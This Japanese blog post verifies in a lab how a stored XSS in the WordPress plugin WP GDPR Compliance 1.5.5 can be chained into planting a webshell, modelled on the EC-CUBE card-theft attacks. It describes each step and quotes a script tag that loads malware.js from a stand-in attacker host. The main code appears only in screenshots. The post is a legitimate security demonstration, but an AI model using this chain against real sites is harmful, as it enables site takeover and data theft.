<div style="text-align:center;">[f:id:motikan2010:20210611234207p:plain]</div>

<div class="contents-box"><p>[:contents]</p></div>

## TL;DR

- WordPressで構築したサイト で XSS から RCE につなげる
  - そのために Webshell を配置

## はじめに

　2021年5月7日にECサイトを構築できるソフトウェアである EC-CUBE にXSSの脆弱性があると公表されました。  

[https://www.ec-cube.net/news/detail.php?news_id=383:embed:cite]

　驚くことにこのXSSの脆弱性は既に悪用され、攻撃を受けたサイトではクレジットカード情報の漏洩が確認されたとのこと。

　この件と WordPress にどのような関係があるのかというと、<span class="m-y">WordPressに導入しているプラグインに XSS が存在している場合に EC-CUBE のときと同様に Webshell を配置することができるかどうかの検証</span>を本記事では行います。

　EC-CUBE が標的となった事例は以下の記事が参考になります。  
[https://blog.trendmicro.co.jp/archives/27875:embed:cite]  

<figure class="figure-image figure-image-fotolife" title="「不正注文」で国内オンラインショップサイトを侵害する攻撃キャンペーン「Water Pamola」 | トレンドマイクロ セキュリティブログ">[f:id:motikan2010:20210611124346j:plain]<figcaption style="font-size:0.7em;">「不正注文」で国内オンラインショップサイトを侵害する攻撃キャンペーン「Water Pamola」 | トレンドマイクロ セキュリティブログ</figcaption></figure>


　本記事では、実際にある WordPress プラグインに発見された XSS を使って Webshell を配置するまでの流れを説明をしていきます。  

<figure class="figure-image figure-image-fotolife" title="Webshell が配置されるまでの流れ">[f:id:motikan2010:20210611133416p:plain]<figcaption style="font-size:0.7em;">Webshell が配置されるまでの流れ</figcaption></figure>

## 検証

　今回の検証環境は以下のとおりです。  

WordPressのバージョンが異なると記述してあるスクリプトがうまく動かない可能性があります。

| ソフトウェア名 | バージョン | 備考|
| - | - | - |
| WordPress | 5.7.2 (2021年6月11現在最新) | - |
| WP GDPR Compliance |1.5.5 | XSSの脆弱性があるバージョン |

### ①【管理者】脆弱性が存在しているプラグインのインストール

　この検証の前提として、WordPressサイトに認証不要のXSSの脆弱性がある必要があります。  

　WordPressのプラグインは日々脆弱性が発見されています。その中から本検証で利用できそうなものを探し、脆弱性が修正されていないバージョンのプラグインをインストールします。

　今回は「WP GDPR Compliance < 1.5.6 - Unauthenticated Stored Cross-Site Scripting (XSS) Security Vulnerability」の脆弱性を利用します。

[f:id:motikan2010:20210611030331p:plain:w700]  
[WP GDPR Compliance < 1.5.6 - Unauthenticated Stored Cross-Site Scripting (XSS) Security Vulnerability](https://wpscan.com/vulnerability/69655879-9fd5-49a3-96ce-81e43b8d8438)

　脆弱性の説明には「認証不要で管理画面にXSSできる」と記載がありますので、本検証にはうってつけの脆弱性です。  

　このプラグインに興味がある方はググってみてください。日本語の記事もあり、アクティブインストール数も20万以上もあることから人気なプラグインであることがわかります。  


　そんな感じで WP GDPR Compliance をインストールしました。バージョンも 1.5.5 であることが確認できます。  

[f:id:motikan2010:20210611102435p:plain:w700]  

　次に脆弱性の検証に必要なプラグインの設定を行います。WP GDPR Compliance の設定画面で下画像の赤枠のよう設定します。  
　この設定を行うことによって、後に埋め込まれる JavaScript の項目が表示されるようになります。

[f:id:motikan2010:20210611030226p:plain:w700]

　 Requests タブを表示します。  
インストール直後は何もデータが無いですが、後々この画面に悪意ある JavaScript が埋め込まれます。  

[f:id:motikan2010:20210611030259p:plain:w700]  

　これで準備は環境です。つまり脆弱なサイトの完成となります。  

### ②【攻撃者】管理画面にスクリプトの埋め込み (XSS)

　次は攻撃者側の準備です。  

　まず標的となるサイトの管理画面上で読み込ませたい JavaScript ファイルを作成します。  

　このスクリプトの主な処理内容は以下のとおりです。  

- テーマの編集画面からセキュリティトークンの取得
- system関数を用いたWebshellを404ページに埋め込むためのリクエストを送信

　検証では `malware.js` のファイル名で保存しているので、XSSで script タグを埋め込む場合はこのファイル名を参照するようにします。  

[f:id:motikan2010:20210611031722p:plain:w700]

　まずプラグインのXSSを再現させるためにはセキュリティトークンが必要になりますが、サイトトップのHTML内にあります。  

[f:id:motikan2010:20210611030251p:plain:w600]  

　取得したセキュリティトークンを用いて以下のように標的となるサイトにリクエストを送信します。  

[f:id:motikan2010:20210611030256p:plain:w600]  

　攻撃に成功すると`<script src=http://attacker.example.com:9000/malware.js><script>` がサイト管理画面に挿入されます。  

　管理画面にタグが埋め込まれるため攻撃者側からタグの有無は確認できません。  

　ひとまず404ページを確認してみます。Webshell が埋め込まれる前は下画像の状態です。  

[f:id:motikan2010:20210611030241p:plain:w600]  
 

### ③【管理者】悪意あるJavaScriptの実行

　サイト管理者は「匿名化リクエストの管理画面」を確認したとします。  

[f:id:motikan2010:20210611032334p:plain:w600]  

　ブラウザの表示上は特に異変は何もなさそうですが、この画面のHTMLソースコードを確認してみます。

[f:id:motikan2010:20210611030310p:plain:w700]  

　攻撃者によって scriptタグが埋め込まれており、攻撃者のXSSスクリプトサーバ上の`malware.js`の読み込みが行われていることが確認できます。  

　JSファイルの処理内容は先に説明してある通り、webshell を配置するリクエストを送信する処理でした。  
そのためこのファイルが読み込まれた時点で以下のリクエストが送信されていました。  

[f:id:motikan2010:20210611030326p:plain:w700] 

　ステータスコードは200で返ってきていますので、テーマ編集画面から取得したセキュリティトークンの検証も問題なく終え、テーマ編集処理が成功したことが分かります。（サイト管理者からすれば成功してしまった・・・）

　念のためテーマ編集画面から404ページのソースコードを確認してみましたが、やはり勝手に Webshell が埋め込まれていました。  

[f:id:motikan2010:20210612172133p:plain:w700]


### ④【攻撃者】Webshellの起動

　そして 404ページは何らかのエラーが表示されるようになりました。  
system関数に値を渡せとありますので、無事 webshell の配置することができました。

[f:id:motikan2010:20210611102018p:plain:w700]

　任意のコマンドが実行できることも確認できました。

[f:id:motikan2010:20210611032452p:plain:w700]

　攻撃は成功したようです。

　今回は webshell 配置をしましたが、管理画面での操作はほとんどできそうです。攻撃者が指定したプラグインのインストール・有効化などもできそうです。（※確認はしていません）

　テーマの`404.php`ではなく`functions.php`を書き換えることで 404ページ以外にも影響を与えることも可能そう。

## まとめ

　XSS経由で管理者の操作をする攻撃は今後増えていきそう。  

　対策もなかなか難しそうな問題とも思ったり...。

　Webshell に改ざんした時に駆除されたり。  
(でも実際のWebshellは複雑で検知されないものもあるので、スキャンツールに頼りすぎないように)  
[https://twitter.com/motikan2010/status/1403036189205032961:embed]

## 更新履歴

- 2021年6月11日 新規作成
